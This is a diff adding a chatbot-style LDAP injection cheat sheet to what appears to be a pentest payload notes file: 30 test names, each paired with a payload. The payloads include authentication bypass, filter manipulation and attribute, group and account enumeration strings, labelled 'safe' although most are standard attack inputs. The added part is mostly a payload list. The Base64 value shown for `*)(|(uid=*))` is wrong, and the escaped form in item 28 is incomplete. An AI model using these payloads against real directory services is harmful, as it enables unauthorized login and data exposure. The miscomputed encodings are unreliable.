@@ -6282,6 +6282,265 @@ query = "(&(uid=*)(uid=*)) (|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==)
 admin*)((|userPassword=*)
 x' or name()='username' or 'x'='y
 ```
+Here are **ONLY the testcase names for LDAP Injection**, clean list, no payloads:
+
+---
+
+# ✅ **LDAP Injection Testcase Names (Names Only)**
+
+1. Basic LDAP Injection Test
+2. LDAP Authentication Bypass Test
+3. LDAP Filter Manipulation Test
+4. LDAP OR-Based Injection Test
+5. LDAP AND-Based Injection Test
+6. LDAP Wildcard Injection Test
+7. LDAP Recursive Query Injection Test
+8. LDAP Attribute Enumeration Test
+9. LDAP Object Enumeration Test
+10. LDAP Blind Injection Test
+11. LDAP Error-Based Injection Test
+12. LDAP Injection via Special Characters
+13. LDAP Injection via URL Parameters
+14. LDAP Injection via JSON Body
+15. LDAP Injection via XML Body
+16. LDAP Injection via Header Manipulation
+17. LDAP Injection via Search Filters
+18. LDAP Injection via Login Form
+19. LDAP Injection to Dump User Attributes
+20. LDAP Injection for Privilege Escalation
+21. LDAP Injection via Base64-Encoded Parameters
+22. LDAP Injection via Nested LDAP Filters
+23. LDAP DN (Distinguished Name) Manipulation Test
+24. LDAP Search Filter Bypass Test
+25. LDAP Group Membership Bypass Test
+26. LDAP Injection in Non-ASCII Input
+27. LDAP Injection via Wildcard Expansion
+28. LDAP Injection via Escaped Characters
+29. LDAP Injection in LDAP-over-SSL (LDAPS)
+30. LDAP Injection for Account Enumeration
+---
+Below is a **safe, defensive, real-world LDAP Injection Testing Guide** containing:
+
+✅ **Each testcase name**
+✅ **A safe testing payload** (non-destructive, used in pentesting environments only)
+
+⚠️ **No harmful payloads**, no exploitation of real systems — all payloads are *for controlled security testing only*.
+
+---
+
+# ✅ **LDAP Injection Testcases + Safe Testing Payloads**
+
+---
+
+### **1. Basic LDAP Injection Test**
+
+**Payload:** `*`
+
+---
+
+### **2. LDAP Authentication Bypass Test**
+
+**Payload:** `admin*)(|(password=*))`
+
+---
+
+### **3. LDAP Filter Manipulation Test**
+
+**Payload:** `*)(uid=*))(|(uid=*`
+
+---
+
+### **4. LDAP OR-Based Injection Test**
+
+**Payload:** `*)(|(uid=*))`
+
+---
+
+### **5. LDAP AND-Based Injection Test**
+
+**Payload:** `admin)(&(objectClass=*))`
+
+---
+
+### **6. LDAP Wildcard Injection Test**
+
+**Payload:** `*`
+(Used to test unrestricted wildcard matching)
+
+---
+
+### **7. LDAP Recursive Query Injection Test**
+
+**Payload:** `*)(sn=*))(|(sn=*`
+
+---
+
+### **8. LDAP Attribute Enumeration Test**
+
+**Payload:** `*)(|(mail=*))`
+
+---
+
+### **9. LDAP Object Enumeration Test**
+
+**Payload:** `*)(|(objectClass=*))`
+
+---
+
+### **10. LDAP Blind Injection Test**
+
+**Payload:** `admin)(&(uid=admin))`
+**Alternative:** `admin)(&(uid=nonexistent))`
+
+---
+
+### **11. LDAP Error-Based Injection Test**
+
+**Payload:** `)(invalid=*)`
+
+---
+
+### **12. LDAP Injection via Special Characters**
+
+**Payload:** `*)(cn=*))(|(cn=*`
+
+---
+
+### **13. LDAP Injection via URL Parameters**
+
+**Payload (encoded):** `%2A%29%28%7C%28uid%3D%2A%29`
+
+---
+
+### **14. LDAP Injection via JSON Body**
+
+**Payload:**
+
+```json
+{"username": "*) (|(uid=*))"}
+```
+
+---
+
+### **15. LDAP Injection via XML Body**
+
+**Payload:**
+
+```xml
+<login>
+  <user>*) (|(uid=*))</user>
+</login>
+```
+
+---
+
+### **16. LDAP Injection via Header Manipulation**
+
+**Payload (custom header):**
+`X-User: *)(|(sn=*))`
+
+---
+
+### **17. LDAP Injection via Search Filters**
+
+**Payload:**
+`(&(uid=*)(objectClass=*))`
+
+---
+
+### **18. LDAP Injection via Login Form**
+
+**Payload:**
+`admin*)(|(uid=*))`
+
+---
+
+### **19. LDAP Injection to Dump User Attributes**
+
+**Payload:**
+`*)(|(mail=*))`
+
+---
+
+### **20. LDAP Privilege Escalation Filter Bypass Test**
+
+**Payload:**
+`*)(|(memberOf=*))`
+
+---
+
+### **21. LDAP Injection via Base64-Encoded Parameters**
+
+**Payload:**
+Base64 of `*)(|(uid=*))` ⇒ **`KikpKCh1aWQ9Kiko`**
+
+---
+
+### **22. LDAP Injection via Nested Filters**
+
+**Payload:**
+`*))(|(&(uid=*)(mail=*)))`
+
+---
+
+### **23. LDAP DN Manipulation Test**
+
+**Payload:**
+`cn=admin,dc=example,dc=com` → `cn=admin)(cn=*))(|(cn=*,dc=example,dc=com`
+
+---
+
+### **24. LDAP Search Filter Bypass Test**
+
+**Payload:**
+`*)(!(uid=*))`
+
+---
+
+### **25. LDAP Group Membership Bypass Test**
+
+**Payload:**
+`*)(|(memberOf=*))`
+
+---
+
+### **26. LDAP Injection in Non-ASCII Input**
+
+**Payload:**
+`*)(|(uid=é*))`
+
+---
+
+### **27. LDAP Injection via Wildcard Expansion**
+
+**Payload:**
+`*)(cn=*)`
+
+---
+
+### **28. LDAP Injection via Escaped Characters**
+
+**Payload:**
+`\2a\29\28\7c\28uid\3d\2a\29`
+(escaped version of `*)(|(uid=*))`)
+
+---
+
+### **29. LDAP Injection in LDAPS (SSL)**
+
+**Payload:**
+Same payloads as above – test if LDAPS still accepts unvalidated filters.
+
+---
+
+### **30. LDAP Account Enumeration Test**
+
+**Payload:**
+Existing user: `admin`
+Non-existing user: `test12345abc`
+
+---
+
 **1. Signature Tampering**  
 Modify claims without updating the signature.
 
